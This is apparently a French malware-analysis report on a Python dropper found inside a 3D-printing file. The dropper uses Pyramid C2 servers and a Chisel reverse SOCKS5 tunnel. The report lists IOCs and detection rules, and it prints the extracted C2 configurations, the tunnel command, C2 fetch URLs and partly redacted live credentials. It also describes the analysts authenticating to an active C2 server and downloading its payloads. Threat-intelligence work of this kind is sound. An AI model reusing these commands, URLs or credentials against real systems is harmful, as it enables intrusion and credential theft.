# RAPPORT D'ANALYSE FORENSIC
## Groupe cybercriminel "PINEAPPLE" - Malware JeffreyEpstein / Pyramid C2

**Date d'analyse** : 13 fevrier 2026  
**Analyste** : tlecavelier, cchopin  
**Classification** : TLP:CLEAR  

---

## 1. RESUME EXECUTIF

L'analyse d'un echantillon malveillant denomme "JeffreyEpstein" a permis d'identifier une infrastructure de commande et controle (C2) exploitee par un groupe se designant sous le nom **"PINEAPPLE"**. L'infrastructure repose sur le framework open-source **Pyramid C2** (par @naksyn) et deploie un tunnel SOCKS5 reverse via **Chisel** pour permettre le pivoting dans les reseaux compromis.

L'infrastructure C2 est hebergee sur des blocs IP geres par **Omegatech LTD**, une societe ecran enregistree aux Seychelles, utilisant le bulletproof hosting sous **AS202412**. Deux serveurs C2 distincts ont ete identifies, avec un mecanisme de fallback automatique.

**Tous les serveurs C2 identifies sont actuellement ACTIFS au moment de l'analyse.**

> **CONTEXTE DE DECOUVERTE** : Ce malware a ete decouvert **embarque dans un fichier d'impression 3D**. Il n'a **jamais ete execute** sur aucun systeme. L'analyse ci-dessous est purement preventive et a visee de renseignement (threat intelligence). **Aucune remediation n'est necessaire.**

---

## 2. VECTEUR D'INFECTION

> **Contexte** : L'echantillon a ete decouvert embarque dans un fichier destine a l'impression 3D. Le malware n'a **pas ete execute** — cette section decrit le vecteur tel qu'il aurait fonctionne si la charge avait ete declenchee.

### 2.1 Dropper initial

Le malware est distribue sous la forme d'un package Python portable pour Windows :

| Composant | Detail |
|-----------|--------|
| **Nom** | JeffreyEpstein.zip (38 MB) |
| **Contenu** | Distribution Python 3.12 complete + script malveillant |
| **Executeur** | JeffreyEpstein.exe (PE32+ x64, lance python3.12 + script .py) |
| **Script** | JeffreyEpstein.py (10 KB, script principal) |
| **Distribution** | Heberge sur NAS Synology a 178[.]16[.]55[.]153 |

### 2.2 Serveur de staging

| Champ | Valeur |
|-------|--------|
| **IP** | 178[.]16[.]55[.]153 |
| **Type** | NAS Synology avec Safe Access active |
| **Certificat SSL** | Synology Router par defaut, expire en 2023 |
| **Protocole** | HTTP/HTTPS |
| **Role** | Distribution du ZIP malveillant |

---

## 3. ANALYSE DU MALWARE

### 3.1 Script principal : JeffreyEpstein.py

**SHA256** : `36a6af23c42a0cc7d42a483c494199ab0ac966b68e96356c29f9386fde18beb7`

Le script contient deux blobs base64 obfusques (prefixes de 5 caracteres junk) qui, une fois decodes (base64 -> zlib decompress), revelent des cradles Pyramid C2 complets.

**Technique d'obfuscation** : Les 5 premiers caracteres de chaque blob base64 sont du "junk" destine a :
- Casser les signatures base64 pour les antivirus/EDR
- Empecher le decodage automatique par les sandboxes
- Eviter les regles YARA basees sur des patterns base64 connus

| Blob | Prefix junk | C2 cible | Chiffrement |
|------|-------------|----------|-------------|
| encoded_script_1 | `ABCDE` | 158[.]94[.]210[.]160 (C2 #1) | XOR |
| encoded_script_2 | `FGHIJ` | 178[.]16[.]53[.]173 (C2 #2) | ChaCha20 modifie |

### 3.2 Logique d'execution

```
JeffreyEpstein.exe
  └── python312.dll + JeffreyEpstein.py
      │
      ├── [Thread 1] Decode "ABCDE..." -> cradle Pyramid
      │   └── Contacte C2 #1 (158[.]94[.]210[.]160:443)
      │       └── Fetch pythonmemorymodule.py
      │           └── Fetch chisel.exe + dependances
      │               └── Injection memoire via PythonMemoryModule
      │                   └── chisel client -> tunnel SOCKS5 reverse
      │
      ├── [Thread Monitor] Surveille log pendant 100s
      │   └── Cherche "[*] Loading in memory module package: pythonmemorymodule"
      │
      ├── [Si echec Thread 1] -> Thread 2 (FALLBACK)
      │   └── Decode "FGHIJ..." -> cradle Pyramid
      │       └── Contacte C2 #2 (178[.]16[.]53[.]173:443)
      │           └── Meme chaine de payload
      │
      └── [keep_alive] Maintient le processus pendant 1800s (30 min)
```

### 3.3 Techniques d'evasion

| Technique | MITRE ATT&CK | Detail |
|-----------|--------------|--------|
| Signed binary proxy | T1218 | Execution depuis python.exe (binaire signe Microsoft) |
| In-memory loading | T1055 | PythonMemoryModule charge les PE sans ecrire sur disque |
| Obfuscation base64 | T1027 | Prefix junk de 5 chars sur les blobs base64 |
| Compression zlib | T1027 | Payloads compresses avant encodage |
| Chiffrement transport | T1573 | XOR / ChaCha20 modifie pour les communications C2 |
| HTTP sur port 443 | T1571 | Simule du HTTPS sans TLS reel |
| Mecanisme de fallback | T1008 | Deux C2 avec basculement automatique |
| Stdout redirect | T1564 | Sortie redirigee vers fichiers log (pas de console visible) |

---

## 4. INFRASTRUCTURE C2

### 4.1 C2 #1 - Serveur principal (158[.]94[.]210[.]160)

| Champ | Valeur |
|-------|--------|
| **IP** | 158[.]94[.]210[.]160 |
| **Bloc** | 158[.]94[.]210[.]0/24 |
| **ASN** | AS202412 (OMEGATECH-AS) |
| **Organisation** | Omegatech LTD |
| **Adresse org** | House of Francis Room 303, Ile du Port, Mahe, Seychelles |
| **Pays WHOIS** | NL (Pays-Bas) |
| **Abuse contact** | abuse[@]omegatech[.]sc |
| **Enregistrement inetnum** | 2025-09-19 |
| **Enregistrement route** | 2026-01-21 |
| **Mainteneur LIR** | lir-tr-mgn-1-MNT (Turquie) |

#### Fingerprint reseau

| Attribut | Valeur |
|----------|--------|
| **Ports ouverts** | 22/tcp (SSH), 443/tcp (HTTP deguise) |
| **SSH** | OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 |
| **Serveur HTTP** | BaseHTTP/0.6 Python/3.12.3 |
| **WWW-Authenticate** | Basic realm="Demo Realm" (signature Pyramid C2) |
| **TLS sur 443** | ABSENT - Handshake echoue ("packet length too long") |
| **Protocole reel** | HTTP en clair sur port 443 |
| **Shodan tags** | self-signed |
| **Shodan ports** | 22, 3389 (RDP), 5357 (WSDAPI), 5985 (WinRM) |
| **OS** | Ubuntu Linux |

#### Configuration C2 extraite (Payload 1)

```
pyramid_server  = '158[.]94[.]210[.]160'
pyramid_port    = '443'
pyramid_user    = 'u02a70[...REDACTED]'
pyramid_pass    = 'zgT9wi[...REDACTED]'
encryption      = 'xor'
encryptionpass  = 'yuYl4C[...REDACTED]'
chacha20IV      = b'12345678'
pyramid_http    = 'http'
encode_encrypt_url = '/727c5f/'
pyramid_module  = 'pythonmemorymodule.py'
```

#### Status : ACTIF

Les credentials ci-dessus sont **valides** au moment de l'analyse. Le serveur repond HTTP 200 avec authentification correcte. Trois payloads ont ete recuperes avec succes directement depuis le C2 (voir section 5).

#### Threat Intelligence (AlienVault OTX)

- **50 pulses** referancant cette IP (10-11 fevrier 2026)
- Familles de malware : Cobalt Strike, Remcos, AsyncRAT, Vidar, Meterpreter, ClearFake
- Tags : c2-infrastructure, threatfox
- GreyNoise : Pas observe en scan actif (profil passif = C2)

### 4.2 C2 #2 - Serveur de fallback (178[.]16[.]53[.]173)

| Champ | Valeur |
|-------|--------|
| **IP** | 178[.]16[.]53[.]173 |
| **Bloc** | 178[.]16[.]53[.]0/24 |
| **ASN** | AS202412 (OMEGATECH-AS) |
| **Organisation** | Omegatech LTD (meme que C2 #1) |
| **Adresse org** | House of Francis Room 303, Ile du Port, Mahe, Seychelles |
| **Pays WHOIS** | NL (Pays-Bas) |
| **Enregistrement inetnum** | 2025-08-19 |
| **Enregistrement route** | 2026-01-21 |
| **Mainteneur LIR** | lir-tr-mgn-1-MNT (Turquie) |

#### Fingerprint reseau

| Attribut | Valeur |
|----------|--------|
| **Ports ouverts (nmap)** | 80/tcp (HTTP), 443/tcp (HTTPS) |
| **Ports Shodan** | 137 (NetBIOS), 443, 5985 (WinRM) |
| **Certificat SSL** | Synology Router par defaut, expire 02/02/2023 |
| **Reverse DNS** | Aucun (NXDOMAIN) |
| **OS probable** | Windows (WinRM + NetBIOS) |

#### Configuration C2 extraite (Payload 2)

```
pyramid_server  = '178[.]16[.]53[.]173'
pyramid_port    = '443'
pyramid_user    = 'Sfs@3a[...REDACTED]'
pyramid_pass    = '6234&3[...REDACTED]'
encryption      = 'chacha20'
encryptionpass  = '6234&3[...REDACTED]'
chacha20IV      = b'12345678'
pyramid_http    = 'http'
encode_encrypt_url = '/login/'
pyramid_module  = 'pythonmemorymodule.py'
```

#### Status : ACTIF

Le serveur repond sur les ports 80 et 443. Retourne HTTP 400 Bad Request (possiblement derriere un reverse proxy ou une configuration differente de Pyramid C2 standard).

#### Threat Intelligence (AlienVault OTX)

- **29 pulses** referancant cette IP (4 fevrier 2026)
- Familles de malware : Stealc, Remcos, Cobalt Strike, Meterpreter, AsyncRAT, Quasar RAT
- Tags : c2-infrastructure, threatfox
- GreyNoise : Pas observe en scan actif

### 4.3 Lien entre les deux C2

Les deux serveurs partagent :
- **Meme ASN** : AS202412 (OMEGATECH-AS)
- **Meme organisation** : Omegatech LTD, Seychelles
- **Meme adresse physique** : House of Francis Room 303, Mahe
- **Meme mainteneur LIR** : lir-tr-mgn-1-MNT (Turquie)
- **Meme date de creation route** : 2026-01-21
- **Infrastructure recente** : Tout cree entre aout 2025 et janvier 2026
- **Profil bulletproof hosting** : Societe ecran aux Seychelles, IP NL, LIR turc

---

## 5. INVENTAIRE COMPLET DU SERVEUR C2

### 5.1 Methodologie d'enumeration

Le serveur C2 #1 (158[.]94[.]210[.]160) ne dispose **d'aucun dashboard, panel d'administration ou interface web**. Pyramid C2 est un serveur HTTP minimaliste (`BaseHTTPServer` Python) qui sert uniquement des fichiers chiffres via Basic Auth.

L'inventaire a ete realise par **enumeration authentifiee** : les credentials valides du Payload 1 ont ete utilisees pour envoyer des requetes HTTP sur l'ensemble des noms de modules et fichiers connus du framework Pyramid. Chaque nom de fichier est chiffre (XOR avec la cle `yuYl4C[...REDACTED]`) puis encode en base64 pour former l'URL de requete. Les reponses non-vides sont dechiffrees et validees (code Python, PE valide, ZIP valide).

- **Methode** : Authentification Basic Auth directe sur `hxxp://158[.]94[.]210[.]160:443` avec les credentials extraites du malware
- **Validation** : Credentials `u02a70[...REDACTED]` / `zgT9wi[...REDACTED]` → **HTTP 200 OK** + exfiltration reussie de tous les fichiers listes ci-dessous
- **Anciennes credentials** : `udc945[...REDACTED]` / `vdMzDT[...REDACTED]` → **HTTP 401 Unauthorized** (rotation de credentials par l'attaquant)
- **C2 #2** (178[.]16[.]53[.]173) : Repond **HTTP 400 Bad Request** systematiquement, credentials non validees

### 5.2 Arsenal complet de l'attaquant

L'enumeration a revele **4 modules offensifs**, **1 executable** et **3 archives de dependances** sur le C2 :

| # | Fichier | Taille | SHA256 | Role |
|---|---------|--------|--------|------|
| 1 | `pythonmemorymodule.py` | 14 179 o | `26e56ee2...8b1ae348` | Orchestrateur — injection PE en memoire |
| 2 | `bh.py` | 25 389 o | `5876f015...ac068ffc` | BeaconHunter — detection/evasion EDR |
| 3 | `DonPAPI.py` | 23 864 o | `53f1fb36...73149d23` | DonPAPI — vol credentials DPAPI |
| 4 | `secretsdump.py` | 32 301 o | `f011825d...c8620af` | Impacket secretsdump — dump SAM/LSA/NTDS |
| 5 | `chisel.exe` | 753 152 o | `5d10b66e...118179ae3` | Tunneling SOCKS5 reverse |
| 6 | `pythonmemorymodule.zip` | 67 746 o | *(dependance)* | Lib PythonMemoryModule (7 fichiers) |
| 7 | `windows.zip` | 792 875 o | *(dependance)* | Lib PythonForWindows (170 fichiers) |
| 8 | `impacket.zip` | 1 170 527 o | `d6628080...a5a59470` | Lib Impacket (pour secretsdump) |

#### Chaine d'attaque reconstituee

```
[Phase 1 - Acces initial]
  JeffreyEpstein.exe -> python312.dll + JeffreyEpstein.py
    └── Contacte C2 -> fetch pythonmemorymodule.py

[Phase 2 - Tunneling]
  pythonmemorymodule.py -> fetch chisel.exe + dependances
    └── Injection memoire via PythonMemoryModule
        └── chisel client 192[.]168[.]178[.]60:8000 R:socks
            └── Tunnel SOCKS5 reverse = pivot reseau

[Phase 3 - Post-exploitation (modules disponibles sur le C2)]
  Via le tunnel SOCKS5, l'attaquant peut deployer :
    ├── secretsdump.py -> Dump SAM/LSA/NTDS.dit (hash NTLM)
    ├── DonPAPI.py     -> Vol credentials DPAPI (Chrome, WiFi, RDP, certificats)
    └── bh.py          -> Detection/evasion des produits de securite (EDR)
```

### 5.3 Detail des modules

#### 5.3.1 pythonmemorymodule.py (injection memoire)

| Champ | Valeur |
|-------|--------|
| **SHA256** | `26e56ee27e6b7a808cffe0c2cf58849c87cc1af44b4625bac68bf43a8b1ae348` |
| **Auteur** | @naksyn (c) 2023 |
| **Role** | Telecharge chisel.exe depuis le C2, le dechiffre et l'injecte en memoire via PythonMemoryModule |
| **Dependances** | pythonmemorymodule.zip, windows.zip |

Configuration du payload :
```python
inject_exe   = True
exe_name     = 'chisel.exe'
command      = ' client 192[.]168[.]178[.]60:8000 R:socks'
```

#### 5.3.2 bh.py (BeaconHunter - evasion EDR)

| Champ | Valeur |
|-------|--------|
| **SHA256** | `5876f01535bc1ed1f0adc5c33d6ee222b423dadc75ae72a71ce8a2deac068ffc` |
| **Auteur** | @naksyn (c) 2022 |
| **Role** | Module de detection et evasion des produits de securite (EDR, antivirus) |
| **Dangerosité** | Permet a l'attaquant d'identifier les defenses en place et d'adapter ses techniques |

#### 5.3.3 DonPAPI.py (vol de credentials DPAPI)

| Champ | Valeur |
|-------|--------|
| **SHA256** | `53f1fb36ae3e57efe2d44180a2e4b3f0e94f1037232dabfe064cbb7a73149d23` |
| **Auteur** | @snovvcrash (c) 2022 |
| **Role** | Extraction de credentials proteges par Windows DPAPI |
| **Cibles** | Mots de passe Chrome/Edge, cles WiFi, credentials RDP, certificats, vaults Windows |
| **Dangerosité** | Acces direct aux secrets utilisateur sans elevation de privileges necessaire |

#### 5.3.4 secretsdump.py (dump hashes NTLM)

| Champ | Valeur |
|-------|--------|
| **SHA256** | `f011825da791a81f9adf4921a5fcc3262f8170f8014e6515c6fedbe9bc8620af` |
| **Auteur** | Diego Capriotti @naksyn (c) 2022, base Impacket |
| **Role** | Extraction de hash depuis SAM, LSA secrets et NTDS.dit (Active Directory) |
| **Dependance** | impacket.zip (1.17 MB) |
| **Dangerosité** | Permet le pass-the-hash, le cracking offline et la compromission de domaine AD |

#### 5.3.5 chisel.exe (tunneling)

| Champ | Valeur |
|-------|--------|
| **SHA256** | `5d10b66e95cec6e2e5b5709ce546df7c2bb27c26e1c732ada98a4bc118179ae3` |
| **Taille** | 753 152 octets |
| **Type** | PE32+ executable for MS Windows 6.00 (GUI), x86-64 |
| **Commande** | `chisel client 192[.]168[.]178[.]60:8000 R:socks` |
| **DLLs importees** | kernel32.dll, shell32.dll, wininet.dll, crypt32.dll, ole32.dll |
| **Injection** | Charge en memoire via PythonMemoryModule (aucun fichier sur disque) |

**Objectif** : Etablir un proxy SOCKS5 inverse permettant a l'attaquant de pivoter dans le reseau interne de la victime via `192[.]168[.]178[.]60:8000`.

### 5.4 Fichiers non trouves sur le C2

L'enumeration a egalement teste la presence de nombreux outils offensifs courants qui n'etaient **pas** deployes sur ce C2 :

- Aucun Mimikatz, Rubeus, SharpHound, Seatbelt, Certify, SharpUp
- Aucun shellcode, beacon, reverse shell, keylogger
- Aucun outil de persistence, privesc ou exfiltration supplementaire
- Aucun lazagne, smbclient, wmiexec

Cela suggere un **kit cible et minimaliste** : acces initial (chisel), credential theft (secretsdump + DonPAPI), et evasion (bh).

---

## 6. CHIFFREMENT DES COMMUNICATIONS

### 6.1 C2 #1 : XOR

- **Algorithme** : XOR simple avec cle cyclique
- **Cle** : `yuYl4C[...REDACTED]` (33 octets)
- **Faiblesses** : Trivialement cassable par analyse frequentielle ou known-plaintext

### 6.2 C2 #2 : ChaCha20 modifie

- **Algorithme** : ChaCha20 avec **3 rounds** au lieu de 20 (standard)
- **Cle** : `6234&3[...REDACTED]` (22 chars, paddee a 32 octets)
- **IV** : `12345678` (STATIQUE - meme IV pour tous les messages)
- **Faiblesses** :
  - 3 rounds = cryptographiquement faible (standard = 20 rounds)
  - IV statique = meme plaintext produit meme ciphertext (deterministe)
  - Cle reutilisee comme mot de passe d'authentification (voir hashes en annexe 11.1)

### 6.3 Transport

Les deux C2 utilisent **HTTP en clair sur le port 443**, sans TLS. Cela permet :
- De passer les firewalls qui autorisent le port 443
- D'etre detecte par un DPI/IDS car le trafic n'est PAS chiffre TLS

---

## 7. TECHNIQUES MITRE ATT&CK

| ID | Technique | Utilisation |
|----|-----------|-------------|
| T1059.006 | Python | Execution du malware via python.exe signe |
| T1218 | Signed Binary Proxy Execution | python.exe comme proxy d'execution |
| T1055 | Process Injection | PythonMemoryModule injection en memoire |
| T1105 | Ingress Tool Transfer | Telechargement de chisel.exe depuis C2 |
| T1027 | Obfuscated Files or Information | Base64 + zlib + prefix junk |
| T1573.001 | Encrypted Channel: Symmetric | XOR / ChaCha20 modifie |
| T1571 | Non-Standard Port | HTTP sur port 443 (sans TLS) |
| T1008 | Fallback Channels | Deux C2 avec basculement automatique |
| T1572 | Protocol Tunneling | Chisel SOCKS5 reverse tunnel |
| T1564 | Hide Artifacts | Stdout redirige vers logs, pas de console |
| T1071.001 | Web Protocols | Communications C2 via HTTP |
| T1204.002 | Malicious File | Distribution via ZIP sur NAS Synology |

---

## 8. INDICATEURS DE COMPROMISSION (IOCs)

### 8.1 Adresses IP

```
158[.]94[.]210[.]160    C2 #1 Pyramid (principal) - ACTIF
178[.]16[.]53[.]173     C2 #2 Pyramid (fallback) - ACTIF
178[.]16[.]55[.]153     Serveur de staging (NAS Synology)
192[.]168[.]178[.]60    Chisel listener (reseau interne attaquant)
```

### 8.2 Blocs reseau

```
158[.]94[.]210[.]0/24   OMEGATECH - AS202412
178[.]16[.]53[.]0/24    OMEGATECH - AS202412
```

### 8.3 ASN

```
AS202412          OMEGATECH-AS - Omegatech LTD
```

### 8.4 Hash SHA256

```
# Dropper
36a6af23c42a0cc7d42a483c494199ab0ac966b68e96356c29f9386fde18beb7  JeffreyEpstein.py
d72294fb338bc2fc8896d25a7395a4db466425427e1559e77185d5135a830681  JeffreyEpstein.exe

# Modules exfiltres depuis le C2 actif
26e56ee27e6b7a808cffe0c2cf58849c87cc1af44b4625bac68bf43a8b1ae348  pythonmemorymodule.py
5876f01535bc1ed1f0adc5c33d6ee222b423dadc75ae72a71ce8a2deac068ffc  bh.py (BeaconHunter)
53f1fb36ae3e57efe2d44180a2e4b3f0e94f1037232dabfe064cbb7a73149d23  DonPAPI.py
f011825da791a81f9adf4921a5fcc3262f8170f8014e6515c6fedbe9bc8620af  secretsdump.py

# Payloads et dependances
5d10b66e95cec6e2e5b5709ce546df7c2bb27c26e1c732ada98a4bc118179ae3  chisel.exe
d66280801e73917850baa39fbfba728ea7a9dd95f19b6e2389fcb667a5a59470  impacket.zip
```

### 8.5 Signatures reseau

```
# Header serveur C2 Pyramid
Server: BaseHTTP/0.6 Python/3.12.3

# Authentification HTTP
WWW-Authenticate: Basic realm="Demo Realm"

# Headers Authorization (base64 des credentials) [REDACTED - voir annexe TLP:AMBER]
Authorization: Basic dTAyYTcwNTc4[...REDACTED]
Authorization: Basic U2ZzQDNhc2RA[...REDACTED]

# URL paths C2
/727c5f/*         (C2 #1)
/login/*          (C2 #2)
/1c4947/*         (anciennes credentials)

# User-Agent
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
```

### 8.6 Noms de fichiers

```
# Dropper
JeffreyEpstein.zip
JeffreyEpstein.exe
JeffreyEpstein.py

# Modules C2
pythonmemorymodule.py
bh.py
DonPAPI.py
secretsdump.py

# Payloads et dependances
chisel.exe
impacket.zip
pythonmemorymodule.zip
windows.zip

# Artefacts d'execution
script_output_1.log
script_output_2.log
```

---

## 9. REGLES DE DETECTION

### 9.1 Suricata / Snort

```
# Detection Pyramid C2 #1
alert http any any -> 158[.]94[.]210[.]160 443 (
  msg:"MALWARE Pyramid C2 PINEAPPLE - C2 #1 Auth";
  content:"Authorization: Basic dTAyYTcwNTc4OTI6";
  content:"/727c5f/";
  sid:2026001; rev:1;
)

# Detection Pyramid C2 #2
alert http any any -> 178[.]16[.]53[.]173 443 (
  msg:"MALWARE Pyramid C2 PINEAPPLE - C2 #2 Auth";
  content:"Authorization: Basic U2ZzQDNhc2RBZHF3ZU";
  content:"/login/";
  sid:2026002; rev:1;
)

# Detection generique Pyramid C2 (signature serveur)
alert http any 443 -> any any (
  msg:"MALWARE Pyramid C2 Server Response";
  content:"BaseHTTP/0.6 Python/3.12";
  content:"Demo Realm";
  sid:2026003; rev:1;
)

# Detection HTTP non-TLS sur port 443
alert tcp any any -> any 443 (
  msg:"SUSPICIOUS HTTP (non-TLS) on port 443";
  content:"GET /"; depth:5;
  content:"Authorization: Basic";
  sid:2026004; rev:1;
)

# Detection Chisel SOCKS5 tunnel
alert tcp any any -> 192[.]168[.]178[.]60 8000 (
  msg:"MALWARE Chisel Reverse SOCKS5 Tunnel - PINEAPPLE";
  sid:2026005; rev:1;
)
```

### 9.2 YARA

```yara
rule PINEAPPLE_JeffreyEpstein_Loader {
    meta:
        description = "Detecte le loader JeffreyEpstein du groupe PINEAPPLE"
        author = "cchopin"
        date = "2026-02-13"
        hash = "36a6af23c42a0cc7d42a483c494199ab0ac966b68e96356c29f9386fde18beb7"

    strings:
        $group = "PINEAPPLE" ascii
        $name1 = "JeffreyEpstein" ascii
        $func1 = "execute_script" ascii
        $func2 = "monitor_logs" ascii
        $func3 = "keep_alive" ascii
        $b64_prefix1 = "ABCDEeNq" ascii
        $b64_prefix2 = "FGHIJeNq" ascii
        $decode = "encoded_script[5:]" ascii
        $target = "pythonmemorymodule" ascii
        $zlib = "zlib.decompress" ascii

    condition:
        3 of them
}

rule PINEAPPLE_Pyramid_Cradle {
    meta:
        description = "Detecte un cradle Pyramid C2 configure pour l'infra PINEAPPLE"
        author = "cchopin"
        date = "2026-02-13"

    strings:
        $pyramid1 = "pyramid_server=" ascii
        $pyramid2 = "pyramid_user=" ascii
        $pyramid3 = "pyramid_pass=" ascii
        $pyramid4 = "encode_encrypt_url=" ascii
        $pyramid5 = "encrypt_wrapper" ascii
        $ip1 = "158[.]94[.]210[.]160" ascii
        $ip2 = "178[.]16[.]53[.]173" ascii
        $user1 = "u02a7057892" ascii
        $user2 = "Sfs@3asdAdqwe" ascii
        $module = "pythonmemorymodule" ascii

    condition:
        (3 of ($pyramid*)) or (any of ($ip*) and any of ($user*)) or ($module and 2 of ($pyramid*))
}

rule PINEAPPLE_Chisel_Payload {
    meta:
        description = "Detecte le payload chisel.exe servi par le C2 PINEAPPLE"
        author = "cchopin"
        date = "2026-02-13"
        hash = "5d10b66e95cec6e2e5b5709ce546df7c2bb27c26e1c732ada98a4bc118179ae3"

    strings:
        $mz = { 4D 5A }
        $s1 = "CoSetProxyBlanket" ascii
        $s2 = "HttpOpenRequestW" ascii
        $s3 = "HttpSendRequestW" ascii
        $s4 = "cmd.exe" ascii

    condition:
        $mz at 0 and 3 of ($s*) and filesize < 1MB
}
```

### 9.3 Sigma (logs Windows)

```yaml
title: PINEAPPLE - JeffreyEpstein Pyramid C2 Activity
id: pineapple-pyramid-c2-2026
status: experimental
description: Detecte l'activite du malware JeffreyEpstein / Pyramid C2
author: cchopin
date: 2026-02-13
logsource:
    category: network_connection
    product: windows
detection:
    selection_ip:
        DestinationIp:
            - '158[.]94[.]210[.]160'
            - '178[.]16[.]53[.]173'
            - '178[.]16[.]55[.]153'
    selection_port:
        DestinationPort: 443
    selection_process:
        Image|endswith:
            - '\python.exe'
            - '\python3.exe'
            - '\JeffreyEpstein.exe'
    condition: selection_ip or (selection_port and selection_process)
    level: critical
    tags:
        - attack.command_and_control
        - attack.t1071.001
        - attack.t1572
```

---

## 10. RECOMMANDATIONS

> **Note** : Le malware ayant ete decouvert dans un fichier d'impression 3D et n'ayant **jamais ete execute**, aucune remediation ou reponse a incident n'est necessaire. Les recommandations ci-dessous sont a titre **preventif uniquement**.

### 10.1 Actions preventives recommandees

1. **Bloquer les IPs** 158[.]94[.]210[.]160, 178[.]16[.]53[.]173, 178[.]16[.]55[.]153 au niveau firewall (entree ET sortie)
2. **Bloquer les subnets** 158[.]94[.]210[.]0/24 et 178[.]16[.]53[.]0/24 (meme operateur bulletproof)
3. **Bloquer l'ASN** AS202412 si possible (infrastructure 100% malveillante)
4. **Deployer les regles** Suricata/YARA/Sigma ci-dessus pour detecter toute future tentative
5. **Reporter** les IOCs aux plateformes de threat intelligence (AbuseIPDB, ThreatFox, OTX)
6. **Sensibiliser les utilisateurs** au risque de malwares embarques dans des fichiers non-executables (fichiers 3D, archives, etc.)

### 10.2 Detection long terme

7. **Alerter sur HTTP non-TLS** sur le port 443 (signature forte du C2 Pyramid)
8. **Alerter sur le header** `WWW-Authenticate: Basic realm="Demo Realm"` (signature Pyramid par defaut)
9. **Monitorer les connexions** depuis python.exe vers des IP externes sur le port 443
10. **Surveiller l'ASN** AS202412 pour de nouvelles allocations IP

---

## 11. ANNEXES

### 11.1 Credentials C2 extraites

| C2 | Utilisateur | Mot de passe | Chiffrement | Cle | Status |
|----|-------------|--------------|-------------|-----|--------|
| #1 | u02a70[...REDACTED] | zgT9wi[...REDACTED] | XOR | yuYl4C[...REDACTED] | VALIDE |
| #2 | Sfs@3a[...REDACTED] | 6234&3[...REDACTED] | ChaCha20 | 6234&3[...REDACTED] | Non teste (HTTP 400) |
| #1 (anciennes) | udc945[...REDACTED] | vdMzDT[...REDACTED] | ChaCha20 | fW0w0S[...REDACTED] | EXPIREES (401) |

#### Hash SHA256 des credentials (pour IOC matching)

| Credential | Valeur redactee | SHA256 |
|------------|-----------------|--------|
| Username C2 #1 | u02a70... | `ab248515ea17f94d3332e92b958ec5abccd7694641af925f4f2e1a25d19874d1` |
| Password C2 #1 | zgT9wi... | `679c725bcfd3899832366a4691dbfa8ea63c55905fe479d1267be763dd72fac2` |
| Cle XOR C2 #1 | yuYl4C... | `7458b1553225cc1b481cba8d88e209d85404e1a2a7ee425fad84d7d31f03aca1` |
| Username C2 #2 | Sfs@3a... | `eed745e2ad04398b25ab22e62fd5667b13a1dbfef0fd5ac8fcfe53083d7ceb6d` |
| Password/Cle C2 #2 | 6234&3... | `aed94432c2930215f11aa186c2dd469a84312623220cb9d87ce675843bfe64e1` |
| Ancien username C2 #1 | udc945... | `57c858397a90e91eeef8e13519ecb77d3cc896565cabc7ce8f24cc716bc7df8c` |
| Ancien password C2 #1 | vdMzDT... | `1cb4aa0f7ab7162fcf5df334f5bd4ccad2251e5d23493d60ccae4f80a178ca15` |
| Ancienne cle C2 #1 | fW0w0S... | `33d67563fb350232b7d75add657c599388bd24d7c24b54617c3620760ad1995d` |

> **Note** : Les credentials completes sont disponibles sur demande sous classification **TLP:AMBER** ou **TLP:RED**. Contacter les analystes (tlecavelier, cchopin).

#### Methode de validation des credentials

Les credentials du C2 #1 ont ete validees par **authentification directe sur le serveur C2 actif** le 13 fevrier 2026 :

1. **Test d'authentification** : Requete HTTP avec header `Authorization: Basic` (base64 de `u02a70[...REDACTED]:zgT9wi[...REDACTED]`) envoyee a `hxxp://158[.]94[.]210[.]160:443` → reponse **HTTP 200 OK**
2. **Preuve par exfiltration** : 4 payloads ont ete telecharges et dechiffres avec succes depuis le C2 en utilisant ces credentials :
   - `pythonmemorymodule.py` (14 179 octets) — dechiffre XOR → code Python valide
   - `chisel.exe` (753 152 octets) — dechiffre XOR → PE32+ x64 valide
   - `pythonmemorymodule.zip` (67 746 octets) — dechiffre XOR → archive ZIP valide (7 fichiers)
   - `windows.zip` (792 875 octets) — dechiffre XOR → archive ZIP valide (170 fichiers)
3. **Anciennes credentials invalides** : Les credentials `udc945[...REDACTED]` / `vdMzDT[...REDACTED]` (issues d'une configuration anterieure) retournent **HTTP 401 Unauthorized**, indiquant une rotation de credentials par l'attaquant.
4. **C2 #2 non valide** : Le serveur 178[.]16[.]53[.]173 repond **HTTP 400 Bad Request** independamment des credentials envoyees, suggerant un reverse proxy ou une configuration Pyramid non standard. Les credentials n'ont pas pu etre confirmees.

### 11.2 URLs C2 reconstruites

```
# C2 #1 - Fetch module
hxxp://158[.]94[.]210[.]160:443/727c5f/CQwtBFstNysfX0EhBgIeQ14HTzgS

# C2 #1 - Fetch chisel.exe
hxxp://158[.]94[.]210[.]160:443/727c5f/HRA1BUImKDctVlo0Dh5XGx8BCSEYUVl3LB0t

# C2 #1 - Fetch dependances ZIP
hxxp://158[.]94[.]210[.]160:443/727c5f/CQwtBFstNysfX0EhBgIeQ14HTGVGREwtIQomHAAlBhoAGDYIQS8/YAhZQw==

# C2 #2 - Fetch module (encode ChaCha20)
hxxp://178[.]16[.]53[.]173:443/login/<chacha20_encoded_path>
```

### 11.3 Arborescence du malware

```
JeffreyEpstein.zip (38 MB)
├── JeffreyEpstein.exe          PE32+ launcher Python
├── JeffreyEpstein.py           Script malveillant principal
├── python3.dll                 Runtime Python 3.12
├── python312.dll               Runtime Python 3.12
├── vcruntime140_1.dll          VC++ Runtime
├── DLLs/                       Modules Python natifs (.pyd)
│   ├── _ssl.pyd
│   ├── _socket.pyd
│   ├── libcrypto-3.dll
│   ├── libssl-3.dll
│   └── ... (34 fichiers)
├── Lib/                        Bibliotheque standard Python
│   └── ... (modules Python)
├── Scripts/                    Scripts Python
│   ├── pip.exe
│   └── ...
├── tcl/                        Tcl/Tk (interface graphique)
│   └── ...
└── Doc/                        Documentation Python (leurre)
    └── html/
```

### 11.4 Timeline

| Date | Evenement |
|------|-----------|
| 2025-08-19 | Creation du bloc 178[.]16[.]53[.]0/24 (OMEGATECH) |
| 2025-09-19 | Creation du bloc 158[.]94[.]210[.]0/24 (OMEGATECH) |
| 2026-01-05 | Enregistrement de l'organisation Omegatech LTD |
| 2026-01-21 | Creation des routes BGP pour les deux blocs |
